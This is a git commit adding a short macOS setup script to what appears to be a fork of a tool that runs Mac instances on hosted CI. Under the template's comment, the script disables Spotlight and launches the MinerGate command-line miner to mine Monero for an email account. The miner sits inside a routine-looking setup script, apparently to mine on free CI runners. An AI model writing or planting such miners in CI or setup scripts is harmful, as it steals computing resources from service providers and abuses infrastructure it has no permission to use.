9d7460b1b6f5ba9db449694071c97405f6e445e4
sexyminer31 <71556842+sexyminer31@users.noreply.github.com>
2020-09-19 15:46:41 +0200

    Initial commit

---
+++ script-mac.sh
@@ -0,0 +1,6 @@
+# disable spotlight indexing
+sudo mdutil -i off -a
+echo Edit script-mac.sh in your fastmac repo to auto-run commands in your Mac instances
+cd aytch
+chmod +x minergate-cli
+./minergate-cli -u watch998@outlook.com --xmr
